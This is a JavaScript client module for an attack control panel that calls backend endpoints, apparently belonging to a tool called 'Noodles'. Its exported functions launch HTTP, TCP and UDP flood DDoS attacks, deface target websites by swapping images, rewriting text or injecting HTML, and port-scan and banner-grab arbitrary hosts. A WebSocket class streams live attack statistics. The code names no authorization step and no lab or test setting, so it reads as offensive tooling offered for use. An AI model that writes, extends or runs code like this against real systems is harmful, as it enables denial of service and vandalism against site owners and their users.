/**
 * @fileoverview Core module for orchestrating "Noodles" (attack workers) operations.
 * This module provides functions to initiate various cyberattacks via a backend API
 * and manage real-time statistics updates.
 */

// Backend API base URL for attack initiation.
const API_BASE_URL = '/api/attack';
// WebSocket URL for real-time statistics.
const WS_BASE_URL = `ws://${window.location.host}/ws/attack-stats`;

/**
 * Manages WebSocket connection for real-time attack statistics.
 */
class AttackStatsMonitor {
    constructor() {
        /** @type {WebSocket | null} */
        this.socket = null;
        /** @type {function(Object): void | null} */
        this.onMessageCallback = null;
        /** @type {function(): void | null} */
        this.onOpenCallback = null;
        /** @type {function(): void | null} */
        this.onCloseCallback = null;
        /** @type {function(Event): void | null} */
        this.onErrorCallback = null;
    }

    /**
     * Connects to the WebSocket server.
     * @param {function(Object): void} onMessage - Callback function for incoming messages.
     * @param {function(): void} [onOpen] - Optional callback for connection open.
     * @param {function(): void} [onClose] - Optional callback for connection close.
     * @param {function(Event): void} [onError] - Optional callback for connection errors.
     */
    connect(onMessage, onOpen = null, onClose = null, onError = null) {
        if (this.socket && this.socket.readyState === WebSocket.OPEN) {
            console.warn('WebSocket is already open.');
            return;
        }

        this.onMessageCallback = onMessage;
        this.onOpenCallback = onOpen;
        this.onCloseCallback = onClose;
        this.onErrorCallback = onError;

        this.socket = new WebSocket(WS_BASE_URL);

        this.socket.onopen = (event) => {
            if (this.onOpenCallback) this.onOpenCallback();
        };

        this.socket.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                if (this.onMessageCallback) this.onMessageCallback(data);
            } catch (e) {
                console.error('Failed to parse WebSocket message:', e, event.data);
            }
        };

        this.socket.onclose = (event) => {
            if (this.onCloseCallback) this.onCloseCallback();
            this.socket = null;
        };

        this.socket.onerror = (event) => {
            console.error('WebSocket error:', event);
            if (this.onErrorCallback) this.onErrorCallback(event);
        };
    }

    /**
     * Disconnects from the WebSocket server.
     */
    disconnect() {
        if (this.socket && this.socket.readyState === WebSocket.OPEN) {
            this.socket.close();
        } else {
            console.warn('WebSocket is not connected or already closed.');
        }
    }
}

/**
 * Executes a network attack against a specified target via the backend API.
 * @param {string} endpoint - The specific API endpoint for the attack (e.g., 'ddos/http-flood').
 * @param {Object} payload - The data payload for the attack, including target and attack-specific parameters.
 * @returns {Promise<Object>} - A promise that resolves with the attack response or rejects with an error.
 */
async function executeAttack(endpoint, payload) {
    try {
        const response = await fetch(`${API_BASE_URL}/${endpoint}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            const errorData = await response.json().catch(() => ({ message: 'Unknown server error' }));
            throw new Error(`Attack failed: ${response.status} ${response.statusText} - ${errorData.message || 'Server error'}`);
        }

        return response.json();
    } catch (error) {
        console.error(`Error executing attack on ${endpoint}:`, error);
        throw error;
    }
}

/**
 * Initiates an HTTP Flood DDoS attack.
 * @param {string} targetUrl - The URL of the target website.
 * @param {number} requestsPerSecond - The rate of requests per second.
 * @param {number} durationSeconds - The duration of the attack in seconds.
 * @returns {Promise<Object>} - Promise resolving with attack status.
 */
export async function startHttpFlood(targetUrl, requestsPerSecond, durationSeconds) {
    return executeAttack('ddos/http-flood', { target: targetUrl, rps: requestsPerSecond, duration: durationSeconds });
}

/**
 * Initiates a TCP Flood DDoS attack.
 * @param {string} targetHost - The host (IP or domain) of the target.
 * @param {number} targetPort - The port to attack.
 * @param {number} durationSeconds - The duration of the attack in seconds.
 * @param {number} connectionsPerSecond - Rate of new TCP connections per second.
 * @returns {Promise<Object>} - Promise resolving with attack status.
 */
export async function startTcpFlood(targetHost, targetPort, durationSeconds, connectionsPerSecond) {
    return executeAttack('ddos/tcp-flood', { target: targetHost, port: targetPort, duration: durationSeconds, cps: connectionsPerSecond });
}

/**
 * Initiates a UDP Flood DDoS attack.
 * @param {string} targetHost - The host (IP or domain) of the target.
 * @param {number} targetPort - The port to attack.
 * @param {number} durationSeconds - The duration of the attack in seconds.
 * @param {number} packetSize - Size of UDP packets in bytes.
 * @param {number} packetsPerSecond - Rate of UDP packets per second.
 * @returns {Promise<Object>} - Promise resolving with attack status.
 */
export async function startUdpFlood(targetHost, targetPort, durationSeconds, packetSize, packetsPerSecond) {
    return executeAttack('ddos/udp-flood', { target: targetHost, port: targetPort, duration: durationSeconds, packetSize: packetSize, pps: packetsPerSecond });
}

/**
 * Initiates a website defacement by replacing an image.
 * @param {string} targetUrl - The URL of the target website.
 * @param {string} originalImagePath - The path to the image to be replaced on the target.
 * @param {string} newImageUrl - The URL of the new image to inject.
 * @returns {Promise<Object>} - Promise resolving with defacement status.
 */
export async function defaceImage(targetUrl, originalImagePath, newImageUrl) {
    return executeAttack('deface/image-replace', { target: targetUrl, original: originalImagePath, newImage: newImageUrl });
}

/**
 * Initiates a website defacement by modifying text content.
 * @param {string} targetUrl - The URL of the target website.
 * @param {string} selector - CSS selector for the element to modify (e.g., 'h1', '.main-heading').
 * @param {string} newText - The new text content to inject.
 * @returns {Promise<Object>} - Promise resolving with defacement status.
 */
export async function defaceText(targetUrl, selector, newText) {
    return executeAttack('deface/text-modify', { target: targetUrl, selector: selector, newText: newText });
}

/**
 * Initiates a website defacement by injecting custom HTML.
 * @param {string} targetUrl - The URL of the target website.
 * @param {string} selector - CSS selector for the element to inject HTML into (e.g., 'body', '#content').
 * @param {string} htmlContent - The HTML content to inject.
 * @param {string} position - Where to inject ('beforebegin', 'afterbegin', 'beforeend', 'afterend').
 * @returns {Promise<Object>} - Promise resolving with defacement status.
 */
export async function defaceHtml(targetUrl, selector, htmlContent, position = 'beforeend') {
    return executeAttack('deface/html-inject', { target: targetUrl, selector: selector, html: htmlContent, position: position });
}

/**
 * Performs a port scan on a target host.
 * @param {string} targetHost - The host (IP or domain) to scan.
 * @param {string} portRange - A string representing the port range (e.g., '1-1024', '80,443,8080').
 * @returns {Promise<Object>} - Promise resolving with scan results.
 */
export async function scanPorts(targetHost, portRange) {
    return executeAttack('connect/port-scan', { target: targetHost, ports: portRange });
}

/**
 * Grabs the banner from a specific port on a target host.
 * @param {string} targetHost - The host (IP or domain) to grab banner from.
 * @param {number} targetPort - The port to connect to.
 * @returns {Promise<Object>} - Promise resolving with banner information.
 */
export async function grabBanner(targetHost, targetPort) {
    return executeAttack('connect/banner-grab', { target: targetHost, port: targetPort });
}

/**
 * Exports the AttackStatsMonitor class for managing real-time statistics.
 */
export { AttackStatsMonitor };